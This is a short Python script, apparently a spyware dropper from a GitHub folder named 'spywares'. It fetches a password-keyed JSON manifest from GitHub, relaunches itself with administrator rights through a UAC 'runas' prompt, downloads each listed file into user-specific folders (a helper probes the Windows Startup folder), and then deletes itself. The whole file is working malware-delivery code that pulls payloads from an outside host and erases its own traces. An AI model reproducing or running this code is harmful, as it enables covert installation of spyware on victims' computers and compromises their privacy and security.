import ctypes
import os
import requests
import json
import sys

pwd=input("Password: ")
user = os.environ['username']
response = requests.get(f"https://github.com/PVER-Programz/spywares/raw/main/TheSusanProject/f{pwd}.json")
inidata = json.loads(response.text)
# print(inidata)
# print(type(inidata))

def is_admin():
	try:
		return ctypes.windll.shell32.IsUserAnAdmin()
	except:
		return False

def is_admin2():
	admPath = 'C:/ProgramData/Microsoft/Windows/Start Menu/Programs/Startup' + "/sample.txt"
	# os.chdir(admPath)
	try:
		with open(admPath, "w") as f:
			f.write("Hello Delete me")
	except PermissionError as e:
		if os.path.isfile(admPath):
			# os.remove(admPath)
			return True
		else:
			return False


if not is_admin():
	ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1) # It just works idk why
	sys.exit()
	pass

for x in inidata:
	response = requests.get(x)
	code = response.content
	filepath = inidata[x].replace("<username>", user)+"/"+x.split("/")[-1]
	if not os.path.exists(os.path.dirname(filepath)):
        os.makedirs(os.path.dirname(filepath))
	with open(filepath, 'wb') as f:
		f.write(code)

os.remove(__file__)